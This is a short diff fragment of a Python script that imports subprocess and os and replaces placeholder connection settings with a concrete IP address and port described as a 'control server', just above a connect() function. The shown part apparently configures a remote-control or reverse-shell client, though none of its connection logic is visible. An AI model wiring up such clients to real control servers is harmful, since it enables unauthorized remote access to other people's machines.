@@ -3,8 +3,8 @@ import subprocess
 import os
 
 # Connection settings
-IP = "SERVER IP"  # Control server IP address
-PORT = PORT       # Control server port
+IP = "185.139.7.144"  # Control server IP address
+PORT =  41321     # Control server port
 
 def connect():
     """
